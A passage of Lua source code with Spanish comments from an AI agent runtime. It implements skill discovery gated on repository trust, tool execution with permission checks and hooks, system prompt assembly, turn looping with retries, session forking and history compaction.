    fm = content:match("^%-%-%-%s*\r?\n(.-)\r?\n%-%-%-%s*$")
    body = ""
  end
  if fm == nil then
    return nil, content
  end
  local ok, meta = pcall(enu.yaml.decode, fm)
  if not ok or type(meta) ~= "table" then
    return nil, body or ""
  end
  return meta, body or ""
end

-- discover_skills_in(dir, source, out) anexa a `out` las skills de `dir` (cada
-- subdirectorio con un `SKILL.md` válido). Tolera un `dir` ausente o ilegible.
local function discover_skills_in(dir, source, out)
  if enu.fs.stat(dir) == nil then return end
  local ok, entries = pcall(enu.fs.list, dir)
  if not ok or type(entries) ~= "table" then return end
  for _, ent in ipairs(entries) do
    if ent.is_dir then
      local skill_md = dir .. "/" .. ent.name .. "/SKILL.md"
      if enu.fs.stat(skill_md) ~= nil then
        local okr, raw = pcall(enu.fs.read, skill_md)
        if okr and type(raw) == "string" then
          local meta = split_skill_md(raw)
          if type(meta) == "table" and type(meta.name) == "string" and meta.name ~= "" then
            out[#out + 1] = {
              name = meta.name,
              description = meta.description or "",
              path = skill_md,
              source = source,
            }
          end
        end
      end
    end
  end
end

-- agent.skills.list(cwd) -> SkillInfo[] (agente.md §6). Descubre las skills del
-- USUARIO (`config.dir()/skills/`, siempre) y las del REPO (`<cwd>/.enu/skills/`,
-- solo si el repo es de confianza, §11.2). SkillInfo = { name, description, path,
-- source = "user"|"repo" }.
M.skills = {}
function M.skills.list(cwd)
  cwd = cwd or enu.fs.cwd()
  local out = {}
  discover_skills_in(enu.config.dir() .. "/skills", "user", out)
  if M.trust.is_trusted(cwd) == true then
    discover_skills_in(cwd .. "/.enu/skills", "repo", out)
  end
  return out
end

-- load_skill_body(cwd, name) -> string|nil. Cuerpo completo de una skill por
-- nombre (lo carga la tool `skill` bajo demanda, §6 fase 2). Respeta la confianza
-- (una skill de repo no se carga si el repo no es de confianza).
local function load_skill_body(cwd, name)
  for _, s in ipairs(M.skills.list(cwd)) do
    if s.name == name then
      local ok, raw = pcall(enu.fs.read, s.path)
      if ok and type(raw) == "string" then
        local _, body = split_skill_md(raw)
        return body
      end
    end
  end
  return nil
end

-- Tool interna `skill` (agente.md §6, inyección en dos fases): el system prompt
-- lleva solo el ÍNDICE (nombre + descripción); el modelo invoca `skill{name}`
-- para cargar el contenido completo bajo demanda (economía de contexto). Es de
-- solo lectura sobre contenido ya confiado (TOFU), así que se concede sin pedir.
-- Solo se OFRECE a las sesiones que tienen skills (ver tools_for_request en
-- M.session); registrarla global hace que `run_tool` encuentre su handler.
M.tool({
  name        = "skill",
  description = "Carga el contenido completo de una skill por su nombre.",
  schema      = { type = "object",
    properties = { name = { type = "string", description = "nombre de la skill" } },
    required = { "name" } },
  permissions = { default = "allow" },
  handler = function(args, ctx)
    local name = (type(args) == "table") and args.name or nil
    if type(name) ~= "string" or name == "" then
      return "error: la tool `skill` requiere `name` (string)"
    end
    local body = load_skill_body(ctx.cwd, name)
    if body == nil then
      return "error: skill desconocida o no confiada: " .. name
    end
    return body
  end,
})

-- ---------------------------------------------------------------------------
-- El handle Session y el TURNO (agente.md §2).
-- ---------------------------------------------------------------------------

local Session = {}
Session.__index = Session

-- Session.usage / Session.id se exponen como campos (agente.md §2). `usage` se
-- actualiza al cerrar cada turno con el `usage` del proveedor.

-- run_tool(session, call) ejecuta UNA tool call (agente.md §2 paso 5): permisos →
-- tool.pre → handler → tool.post → tool_result. Devuelve el bloque `tool_result`
-- canónico (providers.md §2.2) a anexar al historial. Un error en cualquier punto
-- (permiso denegado, handler que lanza, deny de hook) NO rompe el loop: produce un
-- `tool_result` con `is_error = true` y el texto accionable, que el modelo VE
-- (agente.md §3) y puede corregir.
local function run_tool(session, call)
  local sid = session.handle.id
  local tool = tools[call.name]

  -- err_result(text, denial?) -> tool_result is_error. Si `denial` viene (G40),
  -- el objeto estructurado viaja en el meta del bloque (clave `denied`), que
  -- sesiones.md §3 persiste intacto: la denegación acompaña al transcript.
  local function err_result(text, denial)
    emit(sid, "tool.end", { id = call.id, name = call.name, is_error = true, error = text })
    local block = {
      type = "tool_result",
      id = call.id,
      content = { { type = "text", text = text } },
      is_error = true,
    }
    if denial ~= nil then
      block.meta = { denied = denial }
    end
    return block
  end

  -- tool.start se emite ANTES de cualquier salida (incluida la de tool
  -- desconocida): así todo tool.end tiene su tool.start y una UI que empareje
  -- ciclos (contador, spinner) no recibe nunca un end huérfano.
  emit(sid, "tool.start", { id = call.id, name = call.name, args = call.args })

  if tool == nil then
    return err_result(string.format("tool desconocida: %q (no está registrada)", tostring(call.name)))
  end

  -- Permisos (agente.md §5). Denegar produce un error ACCIONABLE devuelto al
  -- modelo como tool_result is_error (el turno no se rompe) Y el objeto
  -- estructurado de G40 por sus dos destinos: el evento (observadores vivos) y
  -- el meta del tool_result (el registro; viaja con el JSONL).
  local granted, reason, denial = check_permission(session, tool, call.args)
  if not granted then
    denial = denial or { tool = call.name, source = "deny" }
    denial.id = call.id
    denial.args = call.args
    emit(sid, "permission.denied", denial)
    return err_result(reason, denial)
  end

  -- Hooks tool.pre (vetar / reescribir args, agente.md §4).
  local pre_payload, deny_reason = run_hooks("tool.pre",
    { tool = call.name, args = call.args, id = call.id }, { session = session.handle })
  if deny_reason ~= nil then
    return err_result(string.format("la tool %q fue vetada por un hook tool.pre: %s", call.name, deny_reason))
  end
  local args = (type(pre_payload) == "table" and pre_payload.args) or call.args

  -- ctx del handler (agente.md §3): session, cwd, progress, ask.
  local ctx = {
    session = session.handle,
    cwd = session.cwd,
    progress = function(text)
      emit(sid, "tool.progress", { id = call.id, name = call.name, text = tostring(text) })
    end,
    ask = function(question)
      -- ask del handler: reusa el flujo de permisos en su versión genérica. En
      -- headless sin UI no hay respuesta → false (coherente con §5 default deny).
      if not enu.has("ui") then
        return false
      end
      ask_seq = ask_seq + 1
      local id = "ask-" .. sid .. "-" .. ask_seq
      local fut = enu.task.future()
      pending_asks[id] = { future = fut, session = sid }
      emit(sid, "permission.asked", { id = id, tool = call.name, question = tostring(question) })
      return fut:await()
    end,
  }

  -- Handler (corre como parte de la task del turno; puede suspender, agente.md
  -- §3). Un error lanzado → tool_result is_error (el modelo lo ve).
  local ok, result = pcall(tool.handler, args, ctx)
  if not ok then
    local msg = (type(result) == "table" and result.message) or tostring(result)
    return err_result(string.format("la tool %q falló: %s", call.name, msg))
  end

  -- Hooks tool.post (reescribir el resultado, agente.md §4).
  local post_payload = run_hooks("tool.post",
    { tool = call.name, args = args, id = call.id, result = result }, { session = session.handle })
  if type(post_payload) == "table" and post_payload.result ~= nil then
    result = post_payload.result
  end

  -- Normaliza el resultado del handler a content: Block[] (providers.md §2.2). Un
  -- string → un bloque de texto; una tabla con `type` → un bloque; un array de
  -- bloques se usa tal cual.
  local content
  if type(result) == "string" then
    content = { { type = "text", text = result } }
  elseif type(result) == "table" and result.type ~= nil then
    content = { result }
  elseif type(result) == "table" then
    content = result -- se asume Block[]
  else
    content = { { type = "text", text = tostring(result) } }
  end

  emit(sid, "tool.end", { id = call.id, name = call.name, is_error = false })
  return { type = "tool_result", id = call.id, content = content }
end

-- consume_stream(session, iter) consume el iterador de Events del adaptador
-- (providers.md §2.3), re-emitiendo los deltas en el bus (`agent:delta`) para
-- quien pinte, y devuelve el `done` (con `stop_reason` y el `Message` ensamblado).
-- El agente NO re-ensambla deltas: el `done` trae el Message completo (§2.3).
local function consume_stream(session, iter)
  local sid = session.handle.id
  local done = nil
  local usage = nil
  for ev in iter do
    if ev.type == "done" then
      done = ev
    elseif ev.type == "usage" then
      usage = ev
      emit(sid, "delta", { kind = "usage", input_tokens = ev.input_tokens,
        output_tokens = ev.output_tokens, cache_read_tokens = ev.cache_read_tokens })
    else
      -- text / thinking / tool_call.* : se re-emiten crudos para la UI en vivo.
      emit(sid, "delta", ev)
    end
  end
  if done == nil then
    eagent("el adaptador cerró el stream sin un evento `done` (providers.md §2.3 lo exige)")
  end
  done._usage = usage
  return done
end

-- ---------------------------------------------------------------------------
-- System prompt por sesión (agente.md §7, P24): base → índice de skills → enu.md
-- (tras TOFU) → opts.system. La INCLUSIÓN del contenido del repo se decide por
-- confianza en CADA ensamblado (cheap: trust cacheado), sobre el descubrimiento
-- capturado una vez al abrir la sesión.
-- ---------------------------------------------------------------------------

-- Session:_has_skills() ¿la sesión ofrece alguna skill (de usuario, o de repo si
-- es de confianza)? Decide si se ofrece la tool `skill` y si hay índice.
function Session:_has_skills()
  if #(self._user_skills or {}) > 0 then return true end
  if M.trust.is_trusted(self.cwd) == true and #(self._repo_skills or {}) > 0 then
    return true
  end
  return false
end

-- Session:_skills_index() -> string|nil. El ÍNDICE de skills (nombre+descripción)
-- para el system prompt (§6 fase 1). Las de usuario siempre; las de repo solo si
-- el repo es de confianza (§11.2).
function Session:_skills_index()
  local list = {}
  for _, s in ipairs(self._user_skills or {}) do list[#list + 1] = s end
  if M.trust.is_trusted(self.cwd) == true then
    for _, s in ipairs(self._repo_skills or {}) do list[#list + 1] = s end
  end
  if #list == 0 then return nil end
  local lines = { "Skills disponibles (usa la tool `skill` con el nombre para cargar su contenido):" }
  for _, s in ipairs(list) do
    lines[#lines + 1] = "- " .. s.name .. ": " .. (s.description or "")
  end
  return table.concat(lines, "\n")
end

-- Session:_repo_context() -> string|nil. El `enu.md` del repo como contexto del
-- proyecto (§7), solo si el repo es de confianza (TOFU, §11.2).
function Session:_repo_context()
  if type(self._nu_md) == "string" and self._nu_md ~= ""
      and M.trust.is_trusted(self.cwd) == true then
    return "Contexto del proyecto (enu.md):\n\n" .. self._nu_md
  end
  return nil
end

-- Session:_assemble_system() -> string|nil. Ensambla por piezas ordenadas
-- (agente.md §7). Devuelve nil si no hay nada (request sin system).
function Session:_assemble_system()
  local parts = {}
  if self.opts.no_base ~= true then
    parts[#parts + 1] = BASE_SYSTEM
  end
  local idx = self:_skills_index()
  if idx then parts[#parts + 1] = idx end
  local ctx = self:_repo_context()
  if ctx then parts[#parts + 1] = ctx end
  if type(self.opts.system) == "string" and self.opts.system ~= "" then
    parts[#parts + 1] = self.opts.system
  end
  if #parts == 0 then return nil end
  return table.concat(parts, "\n\n")
end

-- normalize_user_blocks(content) -> Block[]. Mensaje del usuario (agente.md §2
-- paso 1): string → un bloque de texto; tabla → se asume Block[].
local function normalize_user_blocks(content)
  if type(content) == "string" then
    return { { type = "text", text = content } }
  elseif type(content) == "table" then
    return content
  end
  einval("Session:send espera un string o un array de bloques (providers.md §2.2)")
end

-- Session:send(content) ⏸ -> Message (agente.md §2). EL TURNO COMPLETO con
-- REENTRADA (G4, P23). Cada `send` ENCOLA su mensaje y, si no hay turno en vuelo,
-- arranca uno en una task PROPIA de la sesión (la que `Session:cancel` cancela,
-- P22). El loop drena la cola entre iteraciones —nunca a mitad de un stream—,
-- inyectando las correcciones del usuario ("usa pnpm, no npm"). Todos los `send`
-- consumidos por un mismo turno resuelven con su mensaje final (G4). `send`
-- SUSPENDE esperando ese resultado por un future (no por la task: cancelar el
-- turno no cancela a quien llamó —resuelve su future como cancelado—).
function Session:send(content)
  if self.closed then
    eagent("la sesión está cerrada")
  end
  local blocks = normalize_user_blocks(content)
  local item = { blocks = blocks, fut = enu.task.future() }
  self.queue[#self.queue + 1] = item

  if not self.turn_active then
    self.turn_active = true
    self._turn_done = false
    self.waiters = {}
    self.turn_task = enu.task.spawn(function() self:_turn_loop() end)
  end

  local res = item.fut:await()
  if res.canceled then
    return nil
  end
  return res.message
end

-- Session:retry() ⏸ -> Message (agente.md §2 "Reintento manual", G43). Re-ejecuta
-- el turno sobre el HISTORIAL VIGENTE, SIN anexar mensaje nuevo — el camino de la
-- acción de reintento de una UI tras un `agent:error` (el mensaje del usuario ya
-- está en el historial; un `send` lo DUPLICARÍA). Reutiliza la maquinaria de `send`
-- (task propia del turno + future del mensaje final) pero sin encolar contenido: en
-- vez de un item en la cola —que `_drain_queue` anexaría como mensaje de usuario—,
-- inscribe su waiter DIRECTO en `waiters`, que `_finish_turn` resuelve con el
-- mensaje final igual que a un `send`. `EINVAL` accionable si hay turno en vuelo, la
-- sesión está cerrada, o el historial está vacío (no hay nada que reintentar).
function Session:retry()
  if self.closed then
    einval("no se puede reintentar: la sesión está cerrada")
  end
  if self.turn_active then
    einval("no se puede reintentar: hay un turno en vuelo (espera a que termine o cancélalo)")
  end
  if #self.history == 0 then
    einval("no se puede reintentar: el historial está vacío (no hay turno que re-ejecutar)")
  end

  self.turn_active = true
  self._turn_done = false
  self.waiters = {}
  -- Waiter directo (sin cola): no hay contenido nuevo que inyectar, solo esperar el
  -- mensaje final de este turno re-ejecutado.
  local item = { fut = enu.task.future() }
  self.waiters[#self.waiters + 1] = item
  self.turn_task = enu.task.spawn(function() self:_turn_loop() end)

  local res = item.fut:await()
  if res.canceled then
    return nil
  end
  return res.message
end

-- Session:_drain_queue() inyecta los mensajes encolados (G4): los anexa al
-- historial/store como mensajes de usuario y mueve sus futures a `waiters` (para
-- que resuelvan con el mensaje final de ESTE turno). Se llama al inicio de cada
-- iteración del loop, nunca a mitad de un stream.
function Session:_drain_queue()
  if #self.queue == 0 then
    return
  end
  local pending = self.queue
  self.queue = {}
  for _, it in ipairs(pending) do
    local user_message = { role = "user", content = it.blocks }
    table.insert(self.history, user_message)
    if self.store then
      self.store:append_message(user_message)
    end
    self.waiters[#self.waiters + 1] = it
  end
end

-- Session:_finish_turn(canceled) cierra el turno UNA sola vez (idempotente):
-- resuelve los futures de todos los `send` consumidos (`waiters`) y de los que
-- quedaran sin inyectar (`queue`) con el mensaje final (o `canceled`). Lo invoca
-- el final normal del loop (canceled=false) Y el `enu.task.cleanup` del turno en
-- un aborto (canceled=true, no capturable por pcall, S08): el guard `_turn_done`
-- garantiza que solo la primera llamada resuelve.
function Session:_finish_turn(canceled)
  if self._turn_done then
    return
  end
  self._turn_done = true
  self.turn_active = false
  self.turn_task = nil
  -- Retira los asks de ESTA sesión que quedaran pendientes: un aborto a mitad de
  -- espera dejaría la entrada viva para siempre y un respond() tardío de la UI
  -- escribiría en un future que ya nadie espera. Solo tablas y emit (síncronos):
  -- esto corre también desde el cleanup del turno, donde no se puede suspender.
  for id, p in pairs(pending_asks) do
    if p.session == self.handle.id then
      pending_asks[id] = nil
    end
  end
  local res = canceled and { canceled = true } or { message = self._final_message }
  for _, it in ipairs(self.waiters) do it.fut:set(res) end
  self.waiters = {}
  for _, it in ipairs(self.queue) do it.fut:set(res) end
  self.queue = {}
  if canceled then
    emit(self.handle.id, "turn.end", { canceled = true })
  else
    emit(self.handle.id, "turn.end", { message = self._final_message })
  end
end

-- stream_with_retry(session, adapter, request, provider_config) -> iter. Envuelve
-- SOLO la APERTURA del stream (agente.md §2 paso 3, G42): la política de reintento
-- vive aquí, nunca en el adaptador (providers.md §3 solo MARCA `detail.retryable`).
-- Si `adapter.stream` lanza un error tabla con `detail.retryable == true` y quedan
-- reintentos, espera con backoff exponencial (`retry_base_ms · 2^(intento−1)`),
-- anuncia `agent:retry` y reintenta hasta `session.max_retries` veces. El backoff
-- duerme con `enu.task.sleep`: un punto de suspensión normal, así que un
-- `Session:cancel` durante la espera aborta el turno como siempre (S08). Agotados
-- los reintentos —o un error no retryable / no tabla— relanza el error TAL CUAL,
-- preservando la tabla (y su `retryable`, que G43 lleva hasta la UI). OJO: el
-- CONSUMO del stream queda FUERA de este envoltorio: un fallo a mitad de stream ya
-- pintó deltas y reintentar duplicaría contenido, así que propaga sin reintento.
local function stream_with_retry(session, adapter, request, provider_config)
  local attempt = 0
  while true do
    local ok, iter = pcall(adapter.stream, request, provider_config)
    if ok then
      return iter
    end
    local err = iter
    local retryable = type(err) == "table" and type(err.detail) == "table"
      and err.detail.retryable == true
    if not retryable or attempt >= session.max_retries then
      error(err) -- relanza tal cual: preserva la tabla estructurada (code/detail/retryable)
    end
    attempt = attempt + 1
    local delay = session.retry_base_ms * (2 ^ (attempt - 1))
    -- Un `agent:retry` por cada espera (§4): la UI no muestra segundos de nada.
    emit(session.handle.id, "retry", {
      attempt     = attempt,
      max_retries = session.max_retries,
      delay_ms    = delay,
      code        = (type(err) == "table" and err.code) or nil,
      message     = (type(err) == "table" and err.message) or tostring(err),
    })
    enu.task.sleep(delay)
  end
end

-- Session:_turn_loop() es el cuerpo del turno (agente.md §2), corriendo en la
-- task propia de la sesión. Registra su `cleanup` para cerrar limpio ante un
-- aborto (P22), drena la cola (G4/P23) y autocompacta al rebasar el umbral (P25).
function Session:_turn_loop()
  -- Cierre garantizado pase lo que pase (éxito, error o `Session:cancel`): el
  -- aborto NO es capturable por pcall (S08), así que la resolución de los futures
  -- y el `turn.end` viven en el cleanup, no en un pcall del cuerpo.
  enu.task.cleanup(function() self:_finish_turn(true) end)

  emit(self.handle.id, "turn.start", {})
  self._final_message = nil

  -- El cuerpo del turno corre bajo pcall (frontera robusta): un error NORMAL del
  -- turno —el adaptador/provider lanza (p. ej. 401 por API key ausente o inválida),
  -- un hook request.pre veta, o se agota max_turns— se EMITE como `agent:error` para
  -- que la UI lo pinte, en vez de morir EN SILENCIO (antes la task del turno moría y
  -- `send` devolvía nil como si se hubiera CANCELADO: el turno fallaba sin avisar al
  -- usuario). Un ABORTO por `Session:cancel` NO es capturable por pcall (S08): se
  -- propaga al `cleanup`, que cierra como cancelado —cancelar no es un error a pintar—.
  local ok, turn_err = pcall(function() self:_run_turn_body() end)
  if ok then
    self:_finish_turn(false)
    return
  end
  -- El payload de `agent:error` lleva el error estructurado COMPLETO (G43): la UI
  -- necesita `code` (distinguir un 401 accionable de un timeout) y `retryable`
  -- (decidir si ofrece el reintento manual, `Session:retry`). `retryable` se ALZA
  -- de `detail.retryable` a campo de primer nivel (la señal que toda UI mira). Es
  -- un cambio aditivo: quien solo leía `message` sigue funcionando.
  local msg = (type(turn_err) == "table" and turn_err.message) or tostring(turn_err)
  local code = (type(turn_err) == "table" and turn_err.code) or nil
  local detail = (type(turn_err) == "table" and turn_err.detail) or nil
  local retryable = (type(detail) == "table" and detail.retryable) or nil
  emit(self.handle.id, "error", { message = msg, code = code, retryable = retryable, detail = detail })
  self:_finish_turn(false)
end

-- Session:_repair_history() cierra el hueco que deja un aborto a mitad de tool
-- loop: el assistant (con sus tool_call) se persiste ANTES de ejecutar las tools
-- y los tool_result solo después, así que una cancelación entre medias deja el
-- último mensaje del historial con tool_call sin emparejar. Sintetiza un
-- tool_result de error por cada uno y lo persiste, dejando historial y transcript
-- reanudables. No puede vivir en el cleanup del turno: anexar al store suspende
-- (⏸) y un cleanup es síncrono, por eso se repara al ENTRAR al siguiente turno.
function Session:_repair_history()
  local last = self.history[#self.history]
  if last == nil or last.role ~= "assistant" or type(last.content) ~= "table" then
    return
  end
  local results = {}
  for _, block in ipairs(last.content) do
    if block.type == "tool_call" then
      results[#results + 1] = {
        type = "tool_result",
        id = block.id,
        content = { { type = "text", text = "[la tool no llegó a ejecutarse: el turno se canceló]" } },
        is_error = true,
      }
    end
  end
  if #results == 0 then
    return
  end
  local tool_message = { role = "user", content = results }
  table.insert(self.history, tool_message)
  if self.store then
    self.store:append_message(tool_message)
  end
end

-- Session:_run_turn_body() es el cuerpo del turno (agente.md §2 pasos 2-6): la
-- secuencia de peticiones al provider y la ejecución de tools en orden. Corre bajo
-- el pcall de `_turn_loop`, que convierte cualquier error en un `agent:error` visible
-- y cierra el turno; por eso aquí no se captura nada (deja propagar).
function Session:_run_turn_body()
  local turns = 0

  -- Repara un turno anterior que quedó a medias (S08): si una cancelación llegó
  -- entre persistir el assistant con tool_call y anexar sus tool_result, el
  -- historial viola el emparejamiento tool_call ↔ tool_result (providers.md §2.2)
  -- y el provider rechazaría la sesión entera. Debe correr ANTES de compactar y
  -- de inyectar la cola: los tool_result sintéticos quedan adyacentes al assistant.
  self:_repair_history()

  -- Autocompactación en el LÍMITE del turno (P25): comprime el prefijo viejo
  -- ANTES de inyectar el mensaje nuevo y antes de la primera petición. Se hace
  -- aquí —no entre iteraciones— para no romper el emparejamiento tool_call ↔
  -- tool_result de un loop de tools en vuelo (la compactación a mitad de tool
  -- loop queda fuera de v1; el disparo por turno cubre el caso común).
  self:_maybe_autocompact()

  while true do
    -- Inyecta correcciones encoladas ANTES de ensamblar (G4): entre iteraciones.
    self:_drain_queue()

    turns = turns + 1
    if turns > self.max_turns then
      -- el `eagent` lanza; el pcall de `_turn_loop` lo convierte en un agent:error
      -- (no emitimos aquí para no duplicarlo).
      eagent(string.format("se agotó max_turns (%d) sin que el modelo terminara", self.max_turns),
        { reason = "max_turns" })
    end

    -- Resuelve el adaptador POR ITERACIÓN (G19): así un `Session:set_model` a
    -- mitad de turno aplica desde la siguiente, nunca a mitad de un stream.
    local resolved = providers.resolve(self.model)
    local adapter = resolved.adapter
    local provider_config = resolved.config

    -- Ensambla el request canónico (agente.md §7) y pásalo por request.pre (§4).
    local request = {
      model       = provider_config.model.id,
      system      = self:_assemble_system(),
      messages    = self.history,
      tools       = self.tools_for_request,
      max_tokens  = self.max_tokens,
      temperature = self.temperature,
      -- Control de razonamiento (providers.md §2.1, ADR-016): la opción de la
      -- sesión viaja al request canónico; el adaptador la traduce por-modelo. nil
      -- = sin razonamiento (lo de siempre). Un hook request.pre puede retocarla.
      thinking    = self.thinking,
    }
    local hooked, deny_reason = run_hooks("request.pre", request, { session = self.handle })
    if deny_reason ~= nil then
      eagent("el request fue vetado por un hook request.pre: " .. deny_reason)
    end
    request = hooked or request

    -- Llama al adaptador y consume el stream (agente.md §2 pasos 3-4). La APERTURA
    -- (paso 3) va envuelta en reintento con backoff (G42); el CONSUMO (paso 4) no.
    local iter = stream_with_retry(self, adapter, request, provider_config)
    local done = consume_stream(self, iter)

    local assistant = done.message
    -- Persiste el mensaje del assistant con usage/modelo (agente.md §2 paso 4;
    -- sesiones.md §3): el coste y el llenado de contexto se auditan leyendo el JSONL.
    local usage = done._usage
    table.insert(self.history, assistant)
    if self.store then
      self.store:append_message(assistant, { usage = usage, model = self.model })
    end
    if usage ~= nil then
      self.usage.context_tokens = usage.input_tokens or self.usage.context_tokens
      -- last_usage: el usage del proveedor del ÚLTIMO turno (input/output_tokens),
      -- distinto de `self.usage` (acumulado de la sesión). Lo usa el digesto de un
      -- subagente en modo task (§9) para alinear su forma con la del modo worker.
      self.last_usage = usage
      -- Recuerda los input_tokens para el disparo de autocompactación (P25).
      self._last_input_tokens = usage.input_tokens or self._last_input_tokens
      -- Coste acumulado (agente.md §2: usage.cost_usd). El `cost` del modelo en
      -- providers.toml es USD por MILLÓN de tokens (providers.md §1); sin `cost`
      -- declarado no se acumula nada (no se inventa una tarifa). Fuente de
      -- verdad: el usage del PROVEEDOR, nunca conteo local (providers.md §5).
      local cost = provider_config.model.cost
      if type(cost) == "table" then
        self.usage.cost_usd = self.usage.cost_usd
          + ((usage.input_tokens or 0) * (cost.input or 0)
          + (usage.output_tokens or 0) * (cost.output or 0)) / 1e6
      end
    end
    self.usage.turns = self.usage.turns + 1
    emit(self.handle.id, "message", { message = assistant, usage = usage, stop_reason = done.stop_reason })
    self._final_message = assistant
    -- last_stop_reason: el motivo de parada canónico del último done (§2.3). Lo
    -- consume el Digest de un subagente en modo task (§9), que sin esto no podría
    -- distinguir un final normal de un max_tokens o un refusal.
    self.last_stop_reason = done.stop_reason

    -- ¿Hay tool calls? (agente.md §2 paso 5).
    if done.stop_reason ~= "tool_calls" then
      -- El modelo paró. Si llegó una corrección encolada mientras tanto (G4), NO
      -- terminamos: volvemos a iterar para inyectarla como un nuevo turno de
      -- usuario. Solo se cierra cuando el modelo para Y la cola está vacía.
      if #self.queue == 0 then
        break
      end
    else
      -- Ejecuta cada tool call EN ORDEN (P12: la paralela está pospuesta) y anexa
      -- los tool_result como un mensaje de usuario (providers.md §2.2). Luego vuelve.
      local results = {}
      for _, block in ipairs(assistant.content) do
        if block.type == "tool_call" then
          results[#results + 1] = run_tool(self, block)
        end
      end
      if #results == 0 then
        -- stop_reason=tool_calls pero sin bloques tool_call: el modelo se
        -- contradijo; terminamos para no hacer loop vacío.
        if #self.queue == 0 then
          break
        end
      else
        local tool_message = { role = "user", content = results }
        table.insert(self.history, tool_message)
        if self.store then
          self.store:append_message(tool_message)
        end
      end
    end
    -- vuelve al while (re-pide al provider).
  end
end

-- Session:cancel() cancela el turno en vuelo (agente.md §2 P22). NO vacía la cola
-- (eso es `clear_queue`): cancela la task del turno, cuyo `cleanup` resuelve los
-- `send` pendientes como cancelados. Sin turno en vuelo, no-op.
function Session:cancel()
  local task = self.turn_task
  if task ~= nil and task.cancel ~= nil then
    task:cancel()
  end
end

-- Session:clear_queue() descarta los `send` ENCOLADOS aún no inyectados (G4/P22),
-- resolviéndolos como cancelados. No toca el turno en vuelo (para eso, `cancel`).
function Session:clear_queue()
  local q = self.queue
  self.queue = {}
  for _, it in ipairs(q) do it.fut:set({ canceled = true }) end
end

-- Session:fork(at?, opts?) -> Session (agente.md §2 G39 / sesiones.md §5, P22).
-- Bifurca Y RE-ALOJA: una sesión NUEVA cuyo `meta.parent` apunta a esta y a la
-- entrada `at` (default: el final del historial de mensajes VIGENTE — tras una
-- compactación, el vigente arranca en el resumen), con el prefijo COPIADO — la
-- hija es AUTOCONTENIDA (sesiones.md §5): su replay no sigue la cadena de
-- padres y su fichero viaja solo. El original queda intacto; el árbol de
-- variantes es navegable por los `meta.parent`.
--
-- Herencia (G39): la hija hereda TODOS los opts efímeros del padre en su estado
-- VIGENTE (model tras set_model, thinking tras set_thinking, permisos tras
-- allow/deny/set_permission_mode) salvo los que `opts` sobreescriba — con la
-- excepción de seguridad: los permisos solo RECORTAN (el deny vigente del padre
-- se conserva siempre; el primer deny gana en el pipeline de §5, así que la
-- hija jamás puede lo que el padre tenía denegado). Los `opts` son efímeros
-- como en resume (G18): no se persisten ni reescriben historia. Es la pieza del
-- fork-como-replicación (ronda 8): cada variante en su worktree vía opts.cwd.
function Session:fork(at, opts)
  if self.closed then
    eagent("la sesión está cerrada")
  end
  local n = #self.history
  at = at or n
  if type(at) ~= "number" then
    einval("Session:fork espera un índice de historial (entero) o nil")
  end
  if opts ~= nil and type(opts) ~= "table" then
    einval("Session:fork espera opts como tabla (los de agent.session)")
  end
  opts = opts or {}
  if at < 0 then at = 0 end
  if at > n then at = n end
  local prefix = {}
  for i = 1, at do prefix[i] = self.history[i] end

  local child = {
    model             = self.model,
    cwd               = self.cwd,
    system            = self.opts.system,
    permissions       = self:permissions_view(),
    skills            = self.opts.skills,
    thinking          = self.thinking,
    max_turns         = self.max_turns,
    max_tokens        = self.max_tokens,
    temperature       = self.temperature,
    tools             = self.opts.tools,
    no_store          = self.opts.no_store,
    no_base           = self.opts.no_base,
    compact_threshold = self.compact_threshold,
    compact_model     = self.compact_model,
  }
  for k, v in pairs(opts) do
    child[k] = v
  end
  if opts.permissions ~= nil then
    -- Solo recortar: la política del llamante sustituye mode/allow, pero el
    -- deny vigente del padre se le suma SIEMPRE (nunca ampliados, §9/§11).
    local p = {}
    for k, v in pairs(opts.permissions) do p[k] = v end
    local deny = {}
    for _, v in ipairs(self.permissions.deny or {}) do deny[#deny + 1] = v end
    for _, v in ipairs(opts.permissions.deny or {}) do deny[#deny + 1] = v end
    p.deny = deny
    child.permissions = p
  end
  child.parent = { id = self.handle.id, entry = at }
  child._fork_prefix = prefix
  return M.session(child)
end

-- Session:compact(opts?) ⏸ (agente.md §8 P22/P25). Compactación MANUAL: resume el
-- prefijo viejo y reinicia el historial desde el resumen. Estrategia:
--   1. hook `compact` (§4): recibe la conversación; puede devolver el
--      mensaje-resumen (se usa) o `{deny}` (se aborta, no se compacta);
--   2. por defecto, resumen vía LLM (modelo configurable, por defecto el de la
--      sesión) — `_summarize`.
-- Escribe una entrada `compact` en el transcript (sesiones.md §3), sustituye el
-- historial en memoria por `[resumen]` y emite `agent:compact` (§4).
function Session:compact(opts)
  if self.closed then
    eagent("la sesión está cerrada")
  end
  opts = opts or {}
  local payload, deny = run_hooks("compact", { messages = self.history }, { session = self.handle })
  if deny ~= nil then
    return false -- un hook impidió la compactación (agente.md §8)
  end
  local summary
  if type(payload) == "table" and payload.summary ~= nil then
    summary = payload.summary
  else
    summary = self:_summarize()
  end
  if type(summary) ~= "table" then
    return false
  end
  local replaced = #self.history
  if self.store then
    -- `covers` (sesiones.md §3): cuántas entradas `message` sustituye el resumen.
    -- Sin él, una herramienta externa no puede reconstruir el alcance de la
    -- compactación leyendo solo el JSONL.
    self.store:append({ t = "compact", summary = summary, covers = replaced })
  end
  self.history = { summary }
  self._last_input_tokens = nil -- tras compactar, el contador de autocompact se reinicia
  emit(self.handle.id, "compact", { auto = opts.auto == true, replaced = replaced })
  return true
end

-- Session:_summarize() -> Message. Estrategia de compactación por defecto
-- (agente.md §8): pide al modelo (el `compact_model`, por defecto el de la
-- sesión) un resumen conciso de la conversación y lo devuelve como un mensaje de
-- usuario (el rol más seguro para un prefijo inyectado). Una sola pasada, sin
-- tools. Si la llamada falla, devuelve un resumen mínimo de respaldo (no rompe).
function Session:_summarize()
  local model = self.compact_model or self.model
  local ok, resolved = pcall(providers.resolve, model)
  if not ok then
    return { role = "user", content = { { type = "text",
      text = "[Resumen no disponible: " .. tostring(model) .. "]" } } }
  end
  local req = {
    model    = resolved.config.model.id,
    system   = "Resume la conversación siguiente de forma concisa, preservando "
      .. "decisiones, hechos y el estado del trabajo. No añadas comentarios.",
    messages = self.history,
    max_tokens = self.max_tokens,
  }
  local text = ""
  local ok2 = pcall(function()
    for ev in resolved.adapter.stream(req, resolved.config) do
      if ev.type == "done" and type(ev.message) == "table" then
        for _, b in ipairs(ev.message.content or {}) do
          if b.type == "text" then text = text .. (b.text or "") end
        end
      end
    end
  end)
  if not ok2 or text == "" then
    text = "[Resumen de la conversación previa no disponible]"
  end
  return { role = "user", content = { { type = "text",
